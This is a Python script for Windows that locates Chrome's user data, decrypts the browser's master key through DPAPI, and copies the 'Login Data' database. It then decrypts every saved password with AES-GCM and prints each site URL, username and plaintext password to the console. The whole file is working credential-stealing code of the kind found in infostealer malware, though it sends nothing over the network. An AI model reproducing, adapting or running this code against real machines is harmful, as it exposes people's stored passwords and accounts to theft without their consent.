import os
import json
import base64
import sqlite3
import shutil
import platform
from colorama import init, Fore, Style
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

init(autoreset=True)

def decrypt_dpapi(encrypted_bytes):
    # Uses the Windows DPAPI to decrypt a byte string
    try:
        _, decrypted_bytes = win32crypt.CryptUnprotectData(encrypted_bytes, None, None, None, 0)
        print(decrypted_bytes)
        return decrypted_bytes
    except Exception as e:
        return None


def decrypt_aes_gcm(encrypted_blob, key):
#    Decrypts an AES-256-GCM encrypted blob from Chrome
    try:
        iv = encrypted_blob[3:15]
        ciphertext_with_tag = encrypted_blob[15:]
        aesgcm = AESGCM(key)
        decrypted_password_bytes = aesgcm.decrypt(iv, ciphertext_with_tag, None)
        print(decrypted_password_bytes)
        return decrypted_password_bytes.decode('utf-8')
    except Exception:
        return "DECRYPTION FAILED"

def _get_chrome_windows_creds():
    appdata_path = os.getenv('LOCALAPPDATA')
    chrome_path = os.path.join(appdata_path, 'Google', 'Chrome', 'User Data')
    
    if not os.path.exists(chrome_path):
        print(f"{Fore.RED}[-] Chrome path not found.")
        return []

    print(f"{Fore.GREEN}[+] Found Chrome user data at: {Fore.YELLOW}{chrome_path}")

    local_state_path = os.path.join(chrome_path, 'Local State')
    print(local_state_path)
    decrypted_key = None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
            print(f"{Fore.YELLOW}[!] Informative: loading the local state json file.")
            print(local_state)
        encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
        encrypted_key_bytes = base64.b64decode(encrypted_key_b64)
        dpapi_key = encrypted_key_bytes[5:]
        decrypted_key = decrypt_dpapi(dpapi_key)
        print(decrypted_key)
        if not decrypted_key:
            raise Exception("Failed to decrypt master key using DPAPI.")
        print(f"{Fore.GREEN}[+] Successfully decrypted master key!")


    except Exception as e:
        print(f"{Fore.RED}[-] Could not get and decrypt master key: {e}")
        return []

    db_path = os.path.join(chrome_path, 'Default', 'Login Data')
    temp_db_path = os.path.join(os.getenv('TEMP'), 'login_data_copy.db')
    
    if not os.path.exists(db_path):
        print(f"{Fore.RED}[-] Login Data database not found.")
        return []

    credentials = []
    try:
        shutil.copyfile(db_path, temp_db_path)
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for url, username, encrypted_password in cursor.fetchall():
            if not username or not encrypted_password:
                continue
            decrypted_password = decrypt_aes_gcm(encrypted_password, decrypted_key)
            credentials.append({"url": url, "username": username, "password": decrypted_password})
            
        conn.close()
    finally:
        if os.path.exists(temp_db_path):
            os.remove(temp_db_path)
    
    return credentials


if __name__ == '__main__':
    if platform.system() == "Windows":
        creds = _get_chrome_windows_creds()

        if creds:
            print(f"\n{Fore.GREEN}[+] Found and decrypted {Style.BRIGHT}{len(creds)}{Style.NORMAL} credentials:")
            
            for cred in creds:
                if "DECRYPTION FAILED" in cred['password']:
                    pass_color = Fore.RED
                else:
                    pass_color = Fore.GREEN
                
                print(f"  {Fore.CYAN}{'URL:'.ljust(10)} {Style.RESET_ALL}{cred['url']}")
                print(f"  {Fore.CYAN}{'Username:'.ljust(10)} {Style.RESET_ALL}{cred['username']}")
                print(f"  {Fore.CYAN}{'Password:'.ljust(10)} {pass_color}{cred['password']}")
                print(f"{Fore.WHITE}{'-' * 50}") # Separator for readability
        else:   
            print(f"\n{Fore.YELLOW}[-] No credentials found or an error prevented extraction.")
    else:
        print(f"{Fore.RED}[!] This module is designed to run on Windows only.")